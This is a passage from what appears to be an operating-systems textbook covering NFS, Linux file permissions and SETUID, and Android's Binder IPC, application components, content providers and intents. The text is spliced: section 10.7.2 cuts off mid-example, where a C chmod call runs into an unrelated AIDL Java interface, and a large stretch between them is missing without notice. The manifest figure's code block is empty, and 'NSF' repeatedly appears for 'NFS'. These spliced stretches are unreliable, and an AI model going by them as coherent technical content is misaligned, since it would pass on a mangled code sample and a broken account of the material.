Networking has played a major role in Linux, and UNIX in general, right from the beginning (the first UNIX network was built to move new kernels from the PDP-11/70 to the Interdata 8/32 during the port to the latter). In this section we will examine Sun Microsystem's NFS (Network File System), which is used on all modern Linux systems to join the file systems on separate computers into one logical whole. Currently, the dominant NSF implementation is version 3, introduced in 1994. NSFv4 was introduced in 2000 and provides several enhancements over the previous NFS architecture. Three aspects of NFS are of interest: the architecture, the protocol, and the implementation. We will now examine these in turn, first in the context of the simpler NFS version 3, then we will turn to the enhancements included in v4.

## NFS Architecture

The basic idea behind NFS is to allow an arbitrary collection of clients and servers to share a common file system. In many cases, all the clients and servers are on the same LAN, but this is not required. It is also possible to run NFS over a
wide area network if the server is far from the client. For simplicity we will speak of clients and servers as though they were on distinct machines, but in fact, NFS allows every machine to be both a client and a server at the same time.

Each NFS server exports one or more of its directories for access by remote clients. When a directory is made available, so are all of its subdirectories, so actually entire directory trees are normally exported as a unit. The list of directories a server exports is maintained in a file, often /etc/exports, so these directories can be exported automatically whenever the server is booted. Clients access exported directories by mounting them. When a client mounts a (remote) directory, it becomes part of its directory hierarchy, as shown in Fig. 10-35.

![](./images/8fcc30e4-d6c3-442e-a7e2-8b8316a28e5b-254_750_1125_702_204.jpg)
Figure 10-35. Examples of remote mounted file systems. Directories are shown as squares and files as circles.

In this example, client 1 has mounted the bin directory of server 1 on its own bin directory, so it can now refer to the shell as /bin/sh and get the shell on server 1. Diskless workstations often have only a skeleton file system (in RAM) and get all their files from remote servers like this. Similarly, client 1 has mounted server 2's directory /projects on its directory /usr/ast/work so it can now access file $a$ as /usr/ast/work/proj1/a. Finally, client 2 has also mounted the projects directory and can also access file $a$, only as /mnt/projl/a. As seen here, the same file can have different names on different clients due to its being mounted in a different place in the respective trees. The mount point is entirely local to the clients; the server does not know where it is mounted on any of its clients.

## NFS Protocols

Since one of the goals of NFS is to support a heterogeneous system, with clients and servers possibly running different operating systems on different hardware, it is essential that the interface between the clients and servers be well defined. Only then is anyone able to write a new client implementation and expect it to work correctly with existing servers, and vice versa.

NFS accomplishes this goal by defining two client-server protocols. A protocol is a set of requests sent by clients to servers, along with the corresponding replies sent by the servers back to the clients.

The first NFS protocol handles mounting. A client can send a path name to a server and request permission to mount that directory somewhere in its directory hierarchy. The place where it is to be mounted is not contained in the message, as the server does not care where it is to be mounted. If the path name is legal and the directory specified has been exported, the server returns a file handle to the client. The file handle contains fields uniquely identifying the file-system type, the disk, the i-node number of the directory, and security information. Subsequent calls to read and write files in the mounted directory or any of its subdirectories use the file handle.

When Linux boots, it runs the /etc/rc shell script before going multiuser. Commands to mount remote file systems can be placed in this script, thus automatically mounting the necessary remote file systems before allowing any logins. Alternatively, most versions of Linux also support automounting. This feature allows a set of remote directories to be associated with a local directory. None of these remote directories are mounted (or their servers even contacted) when the client is booted. Instead, the first time a remote file is opened, the operating system sends a message to each of the servers. The first one to reply wins, and its directory is mounted.

Automounting has two principal advantages over static mounting via the $/ e t c / r c$ file. First, if one of the NFS servers named in /etc/rc happens to be down, it is impossible to bring the client up, at least not without some difficulty, delay, and quite a few error messages. If the user does not even need that server at the moment, all that work is wasted. Second, by allowing the client to try a set of servers in parallel, a degree of fault tolerance can be achieved (because only one of them needs to be up), and the performance can be improved (by choosing the first one to reply-presumably the least heavily loaded).

On the other hand, it is tacitly assumed that all the file systems specified as alternatives for the automount are identical. Since NFS provides no support for file or directory replication, it is up to the user to arrange for all the file systems to be the same. Consequently, automounting is most often used for read-only file systems containing system binaries and other files that rarely change.

The second NFS protocol is for directory and file access. Clients can send messages to servers to manipulate directories and read and write files. They can
also access file attributes, such as file mode, size, and time of last modification. Most Linux system calls are supported by NFS, with the perhaps surprising exceptions of open and close.

The omission of open and close is not an accident. It is fully intentional. It is not necessary to open a file before reading it, nor to close it when done. Instead, to read a file, a client sends the server a lookup message containing the file name, with a request to look it up and return a file handle, which is a structure that identifies the file (i.e., contains a file system identifier and i-node number, among other data). Unlike an open call, this lookup operation does not copy any information into internal system tables. The read call contains the file handle of the file to read, the offset in the file to begin reading, and the number of bytes desired. Each such message is self-contained. The advantage of this scheme is that the server does not have to remember anything about open connections in between calls to it. Thus if a server crashes and then recovers, no information about open files is lost, because there is none. A server like this that does not maintain state information about open files is said to be stateless.

Unfortunately, the NFS method makes it difficult to achieve the exact Linux file semantics. For example, in Linux a file can be opened and locked so that other processes cannot access it. When the file is closed, the locks are released. In a stateless server such as NFS, locks cannot be associated with open files, because the server does not know which files are open. NFS therefore needs a separate, additional mechanism to handle locking.

NFS uses the standard UNIX protection mechanism, with the $r w x$ bits for the owner, group, and others (mentioned in Chap. 1 and discussed in detail below). Originally, each request message simply contained the user and group IDs of the caller, which the NFS server used to validate the access. In effect, it trusted the clients not to cheat. Several years' experience abundantly demonstrated that such an assumption was-how shall we put it?-rather naive. Currently, public key cryptography can be used to establish a secure key for validating the client and server on each request and reply. When this option is used, a malicious client cannot impersonate another client because it does not know that client's secret key.

## NFS Implementation

Although the implementation of the client and server code is independent of the NFS protocols, most Linux systems use a three-layer implementation similar to that of Fig. 10-36. The top layer is the system-call layer. This handles calls like open, read, and close. After parsing the call and checking the parameters, it invokes the second layer, the Virtual File System (VFS) layer.

The task of the VFS layer is to maintain a table with one entry for each open file. The VFS layer additionally has an entry, a virtual i-node, or v-node, for every open file. V-nodes are used to tell whether the file is local or remote. For remote files, enough information is provided to be able to access them. For local files, the

![](./images/8fcc30e4-d6c3-442e-a7e2-8b8316a28e5b-257_818_1262_243_136.jpg)
Figure 10-36. The NFS layer structure

file system and i-node are recorded because modern Linux systems can support multiple file systems (e.g., ext2fs, /proc, FAT, etc.). Although VFS was invented to support NFS, most modern Linux systems now support it as an integral part of the operating system, even if NFS is not used.

To see how v-nodes are used, let us trace a sequence of mount, open, and read system calls. To mount a remote file system, the system administrator (or /etc/rc) calls the mount program specifying the remote directory, the local directory on which it is to be mounted, and other information. The mount program parses the name of the remote directory to be mounted and discovers the name of the NFS server on which the remote directory is located. It then contacts that machine, asking for a file handle for the remote directory. If the directory exists and is available for remote mounting, the server returns a file handle for the directory. Finally, it makes a mount system call, passing the handle to the kernel.

The kernel then constructs a v-node for the remote directory and asks the NFS client code in Fig. 10-36 to create an r-node (remote i-node) in its internal tables to hold the file handle. The v-node points to the r-node. Each v-node in the VFS layer will ultimately contain either a pointer to an r-node in the NFS client code, or a pointer to an i-node in one of the local file systems (shown as dashed lines in Fig. 10-36). Thus, from the v-node it is possible to see if a file or directory is local or remote. If it is local, the correct file system and i-node can be located. If it is remote, the remote host and file handle can be located.

When a remote file is opened on the client, at some point during the parsing of the path name, the kernel hits the directory on which the remote file system is mounted. It sees that this directory is remote and in the directory's v-node finds the pointer to the r-node. It then asks the NFS client code to open the file. The NFS client code looks up the remaining portion of the path name on the remote server associated with the mounted directory and gets back a file handle for it. It makes an r-node for the remote file in its tables and reports back to the VFS layer, which puts in its tables a v-node for the file that points to the r-node. Again here we see that every open file or directory has a v-node that points to either an r-node or an i-node.

The caller is given a file descriptor for the remote file. This file descriptor is mapped onto the v-node by tables in the VFS layer. Note that no table entries are made on the server side. Although the server is prepared to provide file handles upon request, it does not keep track of which files happen to have file handles outstanding and which do not. When a file handle is sent to it for file access, it checks the handle, and if it is valid, uses it. Validation can include verifying an authentication key contained in the RPC headers, if security is enabled.

When the file descriptor is used in a subsequent system call, for example, read, the VFS layer locates the corresponding v-node, and from that determines whether it is local or remote and also which i-node or r-node describes it. It then sends a message to the server containing the handle, the file offset (which is maintained on the client side, not the server side), and the byte count. For efficiency reasons, transfers between client and server are done in large chunks, normally 8192 bytes, even if fewer bytes are requested.

When the request message arrives at the server, it is passed to the VFS layer there, which determines which local file system holds the requested file. The VFS layer then makes a call to that local file system to read and return the bytes. These data are then passed back to the client. After the client's VFS layer has gotten the 8-KB chunk it asked for, it automatically issues a request for the next chunk, so it will have it should it be needed shortly. This feature, known as read ahead, improves performance considerably.

For writes an analogous path is followed from client to server. Also, transfers are done in 8-KB chunks here, too. If a write system call supplies fewer than 8 KB of data, the data are just accumulated locally. Only when the entire 8-KB chunk is full is it sent to the server. However, when a file is closed, all of its data are sent to the server immediately.

Another technique used to improve performance is caching, as in ordinary UNIX. Servers cache data to avoid disk accesses, but this is invisible to the clients. Clients maintain two caches, one for file attributes (i-nodes) and one for file data. When either an i-node or a file block is needed, a check is made to see if it can be satisfied out of the cache. If so, network traffic can be avoided.

While client caching helps performance enormously, it also introduces some nasty problems. Suppose that two clients are both caching the same file block and
one of them modifies it. When the other one reads the block, it gets the old (stale) value. The cache is not coherent.

Given the potential severity of this problem, the NFS implementation does several things to mitigate it. For one, associated with each cache block is a timer. When the timer expires, the entry is discarded. Normally, the timer is 3 sec for data blocks and 30 sec for directory blocks. Doing this reduces the risk somewhat. In addition, whenever a cached file is opened, a message is sent to the server to find out when the file was last modified. If the last modification occurred after the local copy was cached, the cache copy is discarded and the new copy fetched from the server. Finally, once every 30 sec a cache timer expires, and all the dirty (i.e., modified) blocks in the cache are sent to the server. While not perfect, these patches make the system highly usable in most practical circumstances.

## NFS Version 4

Version 4 of the Network File System was designed to simplify certain operations from its predecessor. In contrast to NSFv3, which is described above, NFSv4 is a stateful file system. This permits open operations to be invoked on remote files, since the remote NFS server will maintain all file-system-related structures, including the file pointer. Read operations then need not include absolute read ranges, but can be incrementally applied from the previous file-pointer position. This results in shorter messages, and also in the ability to bundle multiple NFSv3 operations in one network transaction.

The stateful nature of NFSv4 makes it easy to integrate the variety of NFSv3 protocols described earlier in this section into one coherent protocol. There is no need to support separate protocols for mounting, caching, locking, or secure operations. NFSv4 also works better with both Linux (and UNIX in general) and Windows file-system semantics.

### 10.7 SECURITY IN LINUX

Linux, as a clone of MINIX and UNIX, has been a multiuser system almost from the beginning. This history means that security and control of information was built in very early on. In the following sections, we will look at some of the security aspects of Linux.

### 10.7.1 Fundamental Concepts

The user community for a Linux system consists of some number of registered users, each of whom has a unique UID (User ID). A UID is an integer between 0 and 65,535. Files (but also processes and other resources) are marked with the

UID of their owner. By default, the owner of a file is the person who created the file, although there is a way to change ownership.

Users can be organized into groups, which are also numbered with 16-bit integers called GIDs (Group IDs). Assigning users to groups is done manually (by the system administrator) and consists of making entries in a system database telling which user is in which group. A user could be in one or more groups at the same time. For simplicity, we will not discuss this feature further.

The basic security mechanism in Linux is simple. Each process carries the UID and GID of its owner. When a file is created, it gets the UID and GID of the creating process. The file also gets a set of permissions determined by the creating process. These permissions specify what access the owner, the other members of the owner's group, and the rest of the users have to the file. For each of these three categories, potential accesses are read, write, and execute, designated by the letters $r$, $w$, and $x$, respectively. The ability to execute a file makes sense only if that file is an executable binary program, of course. An attempt to execute a file that has execute permission but which is not executable (i.e., does not start with a valid header) will fail with an error. Since there are three categories of users and 3 bits per category, 9 bits are sufficient to represent the access rights. Some examples of these 9-bit numbers and their meanings are given in Fig. 10-37.

| Binary | Symbolic | Allowed file accesses |
| :--- | :--- | :--- |
| 111000000 | rwx------ | Owner can read, write, and execute |
| 111111000 | rwxrwx--- | Owner and group can read, write, and execute |
| 110100000 | rw-r----- | Owner can read and write; group can read |
| 110100100 | rw-r--r-- | Owner can read and write; all others can read |
| 111101101 | rwxr-xr-x | Owner can do everything, rest can read and execute |
| 000000000 | --------- | Nobody has any access |
| 000000111 | ------rwx | Only outsiders have access (strange, but legal) |

Figure 10-37. Some example file-protection modes.

The first two entries in Fig. 10-37 allow the owner and the owner's group full access, respectively. The next one allows the owner's group to read the file but not to change it, and prevents outsiders from any access. The fourth entry is common for a data file the owner wants to make public. Similarly, the fifth entry is the usual one for a publicly available program. The sixth entry denies all access to all users. This mode is sometimes used for dummy files used for mutual exclusion because an attempt to create such a file will fail if one already exists. Thus if multiple processes simultaneously attempt to create such a file as a lock, only one of them will succeed. The last example is strange indeed, since it gives the rest of the world more access than the owner. However, its existence follows from the protection rules. Fortunately, there is a way for the owner to subsequently change the protection mode, even without having any access to the file itself.

The user with UID 0 is special and is called the superuser (or root). The superuser has the power to read and write all files in the system, no matter who owns them and no matter how they are protected. Processes with UID 0 also have the ability to make a small number of protected system calls denied to ordinary users. Normally, only the system administrator knows the superuser's password, although many undergraduates consider it a great sport to try to look for security flaws in the system so they can log in as the superuser without knowing the password. Management tends to frown on such activity.

Directories are files and have the same protection modes that ordinary files do except that the $x$ bits refer to search permission instead of execute permission. Thus a directory with mode $r w x r-x r-x$ allows its owner to read, modify, and search the directory, but allows others only to read and search it, but not add or remove files from it.

Special files corresponding to the I/O devices have the same protection bits as regular files. This mechanism can be used to limit access to I/O devices. For example, the printer special file, /dev/lp, could be owned by the root or by a special user, daemon, and have mode $r w-------$ to keep everyone else from directly accessing the printer. After all, if everyone could just print at will, chaos would result.

Of course, having /dev/lp owned by, say, daemon with protection mode $r w-------$ means that nobody else can use the printer. While this would save many innocent trees from an early death, sometimes users do have a legitimate need to print something. In fact, there is a more general problem of allowing controlled access to all I/O devices and other system resources.

This problem was solved by adding a new protection bit, the SETUID bit, to the 9 protection bits discussed above. When a program with the SETUID bit on is executed, the effective UID for that process becomes the UID of the executable file's owner instead of the UID of the user who invoked it. When a process attempts to open a file, it is the effective UID that is checked, not the underlying real UID. By making the program that accesses the printer be owned by daemon but with the SETUID bit on, any user could execute it, and have the power of daemon (e.g., access to /dev/lp) but only to run that program (which might queue print jobs for printing in an orderly fashion).

Many sensitive Linux programs are owned by the root but with the SETUID bit on. For example, the program that allows users to change their passwords, passwd, needs to write in the password file. Making the password file publicly writable would not be a good idea. Instead, there is a program that is owned by the root and which has the SETUID bit on. Although the program has complete access to the password file, it will change only the caller's password and not permit any other access to the password file.

In addition to the SETUID bit there is also a SETGID bit that works analogously, temporarily giving the user the effective GID of the program. In practice, this bit is rarely used, however.

### 10.7.2 Security System Calls in Linux

There are only a small number of system calls relating to security. The most important ones are listed in Fig. 10-38. The most heavily used security system call is chmod. It is used to change the protection mode. For example,
```

s = chmod(“/usr/ast/newgame”, 0755);

package com.example
interface IExample {
void print(String msg);
}

```

Figure 10-47. Simple interface described in AIDL.

An interface description like that in Fig. 10-47 is compiled by AIDL to generate three Java-language classes illustrated in Fig. 10-48:

1. IExample supplies the Java-language interface definition.
2. IExample.Stub is the base class for implementations of this interface. It inherits from Binder, meaning it can be the recipient of IPC calls; it inherits from IExample, since this is the interface being implemented. The purpose of this class is to perform unmarshalling: turn incoming onTransact calls in to the appropriate method call of IExample. A subclass of it is then responsible only for implementing the IExample methods.
3. IExample.Proxy is the other side of an IPC call, responsible for performing marshalling of the call. It is a concrete implementation of IExample, implementing each method of it to transform the call into the appropriate Parcel contents and send it off through a transact call on an IBinder it is communicating with.

![](./images/8fcc30e4-d6c3-442e-a7e2-8b8316a28e5b-284_294_1199_1008_168.jpg)
Figure 10-48. Binder interface inheritance hierarchy.

With these classes in place, there is no longer any need to worry about the mechanics of an IPC. Implementors of the IExample interface simply derive from IExample.Stub and implement the interface methods as they normally would. Callers will receive an IExample interface that is implemented by IExample.Proxy, allowing them to make regular calls on the interface.

The way these pieces work together to perform a complete IPC operation is shown in Fig. 10-49. A simple print call on an IExample interface turns into:

1. IExample.Proxy marshals the method call into a Parcel, calling transact on the underlying BinderProxy.
2. BinderProxy constructs a kernel transaction and delivers it to the kernel through an ioctl call.
3. The kernel transfers the transaction to the intended process, delivering it to a thread that is waiting in its own ioctl call.

4. The transaction is decoded back into a Parcel and onTransact called on the appropriate local object, here ExampleImpl (which is a subclass of IExample.Stub).
5. IExample.Stub decodes the Parcel into the appropriate method and arguments to call, here calling print.
6. The concrete implementation of print in ExampleImpl finally executes.

![](./images/8fcc30e4-d6c3-442e-a7e2-8b8316a28e5b-285_606_1250_640_143.jpg)
Figure 10-49. Full path of an AIDL-based Binder IPC.

The bulk of Android's IPC is written using this mechanism. Most services in Android are defined through AIDL and implemented as shown here. Recall the previous Fig. 10-40 showing how the implementation of the package manager in the system_server process uses IPC to publish itself with the service manager for other processes to make calls to it. Two AIDL interfaces are involved here: one for the service manager and one for the package manager. For example, Fig. 10-50 shows the basic AIDL description for the service manager; it contains the getService method, which other processes use to retrieve the IBinder of system service interfaces like the package manager.

### 10.8.8 Android Applications

Android provides an application model that is very different from the normal command-line environment in the Linux shell or even applications launched from a graphical user interface. An application is not an executable file with a main entry point; it is a container of everything that makes up that app: its code, graphical resources, declarations about what it is to the system, and other data.
```

package android.os
interface IServiceManager {
IBinder getService(String name);
void addService(String name, IBinder binder);
}

```

Figure 10-50. Basic service manager AIDL interface.

An Android application by convention is a file with the apk extension, for Android Package. This file is actually a normal zip archive, containing everything about the application. The important contents of an apk are:

1. A manifest describing what the application is, what it does, and how to run it. The manifest must provide a package name for the application, a Java-style scoped string (such as com.android.app.calculator), which uniquely identifies it.
2. Resources needed by the application, including strings it displays to the user, XML data for layouts and other descriptions, graphical bitmaps, etc.
3. The code itself, which may be Dalvik bytecode as well as native library code.
4. Signing information, securely identifying the author.

The key part of the application for our purposes here is its manifest, which appears as a precompiled XML file named AndroidManifest.xml in the root of the apk's zip namespace. A complete example manifest declaration for a hypothetical email application is shown in Fig. 10-51: it allows you to view and compose emails and also includes components needed for synchronizing its local email storage with a server even when the user is not currently in the application.

Android applications do not have a simple main entry point which is executed when the user launches them. Instead, they publish under the manifest's <application> tag a variety of entry points describing the various things the application can do. These entry points are expressed as four distinct types, defining the core types of behavior that applications can provide: activity, receiver, service, and content provider. The example we have presented shows a few activities and one declaration of the other component types, but an application may declare zero or more of any of these.

Each of the different four component types an application can contain has different semantics and uses within the system. In all cases, the android:name attribute supplies the Java class name of the application code implementing that component, which will be instantiated by the system when needed.
```

```

Figure 10-51. Basic structure of AndroidManifest.xml.

The package manager is the part of Android that keeps track of all application packages. It parses every application's manifest, collecting and indexing the information it finds in them. With that information, it then provides facilities for clients to query it about the currently installed applications and retrieve relevant information about them. It is also responsible for installing applications (creating storage space for the application and ensuring the integrity of the apk) as well as everything needed to uninstall (cleaning up everything associated with a previously installed app).

Applications statically declare their entry points in their manifest so they do not need to execute code at install time that registers them with the system. This design makes the system more robust in many ways: installing an application does not require running any application code, the top-level capabilities of the application can always be determined by looking at the manifest, there is no need to keep a separate database of this information about the application which can get out of sync (such as across updates) with the application's actual capabilities, and it guarantees no information about an application can be left around after it is uninstalled. This decentralized approach was taken to avoid many of these types of problems caused by Windows' centralized Registry.

Breaking an application into finer-grained components also serves our design goal of supporting interoperation and collaboration between applications. Applications can publish pieces of themselves that provide specific functionality, which other applications can make use of either directly or indirectly. This will be illustrated as we look in more detail at the four kinds of components that can be published.

Above the package manager sits another important system service, the activity manager. While the package manager is responsible for maintaining static information about all installed applications, the activity manager determines when, where, and how those applications should run. Despite its name, it is actually responsible for running all four types of application components and implementing the appropriate behavior for each of them.

## Activities

An activity is a part of the application that interacts directly with the user through a user interface. When the user launches an application on their device, this is actually an activity inside the application that has been designated as such a main entry point. The application implements code in its activity that is responsible for interacting with the user.

The example email manifest shown in Fig. 10-51 contains two activities. The first is the main mail user interface, allowing users to view their messages; the second is a separate interface for composing a new message. The first mail activity is declared as the main entry point for the application, that is, the activity that will be started when the user launches it from the home screen.

Since the first activity is the main activity, it will be shown to users as an application they can launch from the main application launcher. If they do so, the system will be in the state shown in Fig. 10-52. Here the activity manager, on the left side, has made an internal ActivityRecord instance in its process to keep track of the activity. One or more of these activities are organized into containers called tasks, which roughly correspond to what the user experiences as an application. At this point the activity manager has started the email application's process and an instance of its MainMailActivity for displaying its main UI, which is associated
with the appropriate ActivityRecord. This activity is in a state called resumed since it is now in the foreground of the user interface.

![](./images/8fcc30e4-d6c3-442e-a7e2-8b8316a28e5b-289_379_1110_334_213.jpg)
Figure 10-52. Starting an email application's main activity.

If the user were now to switch away from the email application (not exiting it) and launch a camera application to take a picture, we would be in the state shown in Fig. 10-53. Note that we now have a new camera process running the camera's main activity, an associated ActivityRecord for it in the activity manager, and it is now the resumed activity. Something interesting also happens to the previous email activity: instead of being resumed, it is now stopped and the ActivityRecord holds this activity's saved state.

![](./images/8fcc30e4-d6c3-442e-a7e2-8b8316a28e5b-289_644_1110_1166_215.jpg)
Figure 10-53. Starting the camera application after email.

When an activity is no longer in the foreground, the system asks it to "save its state." This involves the application creating a minimal amount of state information representing what the user currently sees, which it returns to the activity
manager and stores in the system_server process, in the ActivityRecord associated with that activity. The saved state for an activity is generally small, containing for example where you are scrolled in an email message, but not the message itself, which will be stored elsewhere by the application in its persistent storage.

Recall that although Android does demand paging (it can page in and out clean RAM that has been mapped from files on disk, such as code), it does not rely on swap space. This means all dirty RAM pages in an application's process must stay in RAM. Having the email's main activity state safely stored away in the activity manager gives the system back some of the flexibility in dealing with memory that swap provides.

For example, if the camera application starts to require a lot of RAM, the system can simply get rid of the email process, as shown in Fig. 10-54. The ActivityRecord, with its precious saved state, remains safely tucked away by the activity manager in the system_server process. Since the system_server process hosts all of Android's core system services, it must always remain running, so the state saved here will remain around for as long as we might need it.

![](./images/8fcc30e4-d6c3-442e-a7e2-8b8316a28e5b-290_653_1111_944_212.jpg)
Figure 10-54. Removing the email process to reclaim RAM for the camera.

Our example email application not only has an activity for its main UI, but includes another ComposeActivity. Applications can declare any number of activities they want. This can help organize the implementation of an application, but more importantly it can be used to implement cross-application interactions. For example, this is the basis of Android's cross-application sharing system, which the ComposeActivity here is participating in. If the user, while in the camera application, decides she wants to share a picture she took, our email application's ComposeActivity is one of the sharing options she has. If it is selected, that activity will
be started and given the picture to be shared. (Later we will see how the camera application is able to find the email application's ComposeActivity.)

Performing that share option while in the activity state seen in Fig. 10-54 will lead to the new state in Fig. 10-55. There are a number of important things to note:

1. The email app's process must be started again, to run its ComposeActivity.
2. However, the old MailMainActivity is not started at this point, since it is not needed. This reduces RAM use.
3. The camera's task now has two records: the original CameraMainActivity we had just been in, and the new ComposeActivity that is now displayed. To the user, these are still one cohesive task: it is the camera currently interacting with them to email a picture.
4. The new ComposeActivity is at the top, so it is resumed; the previous CameraMainActivity is no longer at the top, so its state has been saved. We can at this point safely quit its process if its RAM is needed elsewhere.

![](./images/8fcc30e4-d6c3-442e-a7e2-8b8316a28e5b-291_812_1113_1069_211.jpg)
Figure 10-55. Sharing a camera picture through the email application.

Finally let us look at would happen if the user left the camera task while in this last state (that is, composing an email to share a picture) and returned to the email
application. Figure 10-56 shows the new state the system will be in. Note that we have brought the email task with its main activity back to the foreground. This makes MailMainActivity the foreground activity, but there is currently no instance of it running in the application's process.

![](./images/8fcc30e4-d6c3-442e-a7e2-8b8316a28e5b-292_811_1110_420_214.jpg)
Figure 10-56. Returning to the email application.

To return to the previous activity, the system makes a new instance, handing it back the previously saved state the old instance had provided. This action of restoring an activity from its saved state must be able to bring the activity back to the same visual state as the user last left it. To accomplish this, the application will look in its saved state for the message the user was in, load that message's data from its persistent storage, and then apply any scroll position or other user-interface state that had been saved.

## Services

A service has two distinct identities:

1. It can be a self-contained long-running background operation. Common examples of using services in this way are performing background music playback, maintaining an active network connection (such as with an IRC server) while the user is in other applications, downloading or uploading data in the background, etc.

2. It can serve as a connection point for other applications or the system to perform rich interaction with the application. This can be used by applications to provide secure APIs for other applications, such as to perform image or audio processing, provide a text to speech, etc.

The example email manifest shown in Fig. 10-51 contains a service that is used to perform synchronization of the user's mailbox. A common implementation would schedule the service to run at a regular interval, such as every 15 minutes, starting the service when it is time to run, and stopping itself when done.

This is a typical use of the first style of service, a long-running background operation. Figure 10-57 shows the state of the system in this case, which is quite simple. The activity manager has created a ServiceRecord to keep track of the service, noting that it has been started, and thus created its SyncService instance in the application's process. While in this state the service is fully active (barring the entire system going to sleep if not holding a wake lock) and free to do what it wants. It is possible for the application's process to go away while in this state, such as if the process crashes, but the activity manager will continue to maintain its ServiceRecord and can at that point decide to restart the service if desired.

![](./images/8fcc30e4-d6c3-442e-a7e2-8b8316a28e5b-293_246_1059_1036_238.jpg)
Figure 10-57. Starting an application service.

To see how one can use a service as a connection point for interaction with other applications, let us say that we want to extend our existing SyncService to have an API that allows other applications to control its sync interval. We will need to define an AIDL interface for this API, like the one shown in Fig. 10-58.
```

package com.example.email
interface ISyncControl {
int getSyncInterval();
void setSyncInterval(int seconds);
}

```

Figure 10-58. Interface for controlling a sync service's sync interval.

To use this, another process can bind to our application service, getting access to its interface. This creates a connection between the two applications, shown in Fig. 10-59. The steps of this process are:

1. The client application tells the activity manager that it would like to bind to the service.
2. If the service is not already created, the activity manager creates it in the service application's process.
3. The service returns the IBinder for its interface back to the activity manager, which now holds that IBinder in its ServiceRecord.
4. Now that the activity manager has the service IBinder, it can be sent back to the original client application.
5. The client application now having the service's IBinder may proceed to make any direct calls it would like on its interface.

![](./images/8fcc30e4-d6c3-442e-a7e2-8b8316a28e5b-294_544_1120_811_208.jpg)
Figure 10-59. Binding to an application service.

## Receivers

A receiver is the recipient of (typically external) events that happen, generally in the background and outside of normal user interaction. Receivers conceptually are the same as an application explicitly registering for a callback when something interesting happens (an alarm goes off, data connectivity changes, etc), but do not require that the application be running in order to receive the event.

The example email manifest shown in Fig. 10-51 contains a receiver for the application to find out when the device's storage becomes low in order for it to stop synchronizing email (which may consume more storage). When the device's storage becomes low, the system will send a broadcast with the low storage code, to be delivered to all receivers interested in the event.

Figure 10-60 illustrates how such a broadcast is processed by the activity manager in order to deliver it to interested receivers. It first asks the package manager
for a list of all receivers interested in the event, which is placed in a Broadcast-Record representing that broadcast. The activity manager will then proceed to step through each entry in the list, having each associated application's process create and execute the appropriate receiver class.

![](./images/8fcc30e4-d6c3-442e-a7e2-8b8316a28e5b-295_622_1112_422_210.jpg)
Figure 10-60. Sending a broadcast to application receivers.

Receivers only run as one-shot operations. When an event happens, the system finds any receivers interested in it, delivers that event to them, and once they have consumed the event they are done. There is no ReceiverRecord like those we have seen for other application components, because a particular receiver is only a transient entity for the duration of a single broadcast. Each time a new broadcast is sent to a receiver component, a new instance of that receiver's class is created.

## Content Providers

Our last application component, the content provider, is the primary mechanism that applications use to exchange data with each other. All interactions with a content provider are through URIs using a content: scheme; the authority of the URI is used to find the correct content-provider implementation to interact with.

For example, in our email application from Fig. 10-51, the content provider specifies that its authority is com.example.email.provider.email. Thus URIs operating on this content provider would start with
```

[content://com.example.email.provider.email/](content://com.example.email.provider.email/)

```

The suffix to that URI is interpreted by the provider itself to determine which data within it is being accessed. In the example here, a common convention would be that the URI
content://com.example.email.provider.email/messages
means the list of all email messages, while
content://com.example.email.provider.email/messages/1
provides access to a single message at key number 1.
To interact with a content provider, applications always go through a system API called ContentResolver, where most methods have an initial URI argument indicating the data to operate on. One of the most often used ContentResolver methods is query, which performs a database query on a given URI and returns a Cursor for retrieving the structured results. For example, retrieving a summary of all of the available email messages would look something like:
query("content://com.example.email.provider.email/messages")
Though this does not look like it to applications, what is actually going on when they use content providers has many similarities to binding to services. Figure 10-61 illustrates how the system handles our query example:

1. The application calls ContentResolver.query to initiate the operation.
2. The URI's authority is handed to the activity manager for it to find (via the package manager) the appropriate content provider.
3. If the content provider is not already running, it is created.
4. Once created, the content provider returns to the activity manager its IBinder implementing the system's IContentProvider interface.
5. The content provider's Binder is returned to the ContentResolver.
6. The content resolver can now complete the initial query operation by calling the appropriate method on the AIDL interface, returning the Cursor result.

Content providers are one of the key mechanisms for performing interactions across applications. For example, if we return to the cross-application sharing system previously described in Fig. 10-55, content providers are the way data is actually transferred. The full flow for this operation is:

1. A share request that includes the URI of the data to be shared is created and is submitted to the system.
2. The system asks the ContentResolver for the MIME type of the data behind that URI; this works much like the query method we just discussed, but asks the content provider to return a MIME-type string for the URI.

![](./images/8fcc30e4-d6c3-442e-a7e2-8b8316a28e5b-297_570_1105_246_217.jpg)
Figure 10-61. Interacting with a content provider.

3. The system finds all activities that can receive data of the identified MIME type.
4. A user interface is shown for the user to select one of the possible recipients.
5. When one of these activities is selected, the system launches it.
6. The share-handling activity receives the URI of the data to be shared, retrieves its data through ContentResolver, and performs its appropriate operation: creates an email, stores it, etc..

### 10.8.9 Intents

A detail that we have not yet discussed in the application manifest shown in Fig. 10-51 is the <intent-filter> tags included with the activities and receiver declarations. This is part of the intent feature in Android, which is the cornerstone for how different applications identify each other in order to be able to interact and work together.

An intent is the mechanism Android uses to discover and identify activities, receivers, and services. It is similar in some ways to the Linux shell's search path, which the shell uses to look through multiple possible directories in order to find an executable matching command names given to it.

There are two major types of intents: explicit and implicit. An explicit intent is one that directly identifies a single specific application component; in Linux shell terms it is the equivalent to supplying an absolute path to a command. The
most important part of such an intent is a pair of strings naming the component: the package name of the target application and class name of the component within that application. Now referring back to the activity of Fig. 10-52 in application Fig. 10-51, an explicit intent for this component would be one with package name com.example.email and class name com.example.email.MailMainActivity.

The package and class name of an explicit intent are enough information to uniquely identify a target component, such as the main email activity in Fig. 10-52. From the package name, the package manager can return everything needed about the application, such as where to find its code. From the class name, we know which part of that code to execute.

An implicit intent is one that describes characteristics of the desired component, but not the component itself; in Linux shell terms this is the equivalent to supplying a single command name to the shell, which it uses with its search path to find a concrete command to be run. This process of finding the component matching an implicit intent is called intent resolution.

Android's general sharing facility, as we previously saw in Fig. 10-55's illustration of sharing a photo the user took from the camera through the email application, is a good example of implicit intents. Here the camera application builds an intent describing the action to be done, and the system finds all activities that can potentially perform that action. A share is requested through the intent action android.intent.action.SEND, and we can see in Fig. 10-51 that the email application's compose activity declares that it can perform this action.

There can be three outcomes to an intent resolution: (1) no match is found, (2) a single unique match is found, or (3) there are multiple activities that can handle the intent. An empty match will result in either an empty result or an exception, depending on the expectations of the caller at that point. If the match is unique, then the system can immediately proceed to launching the now explicit intent. If the match is not unique, we need to somehow resolve it in another way to a single result.

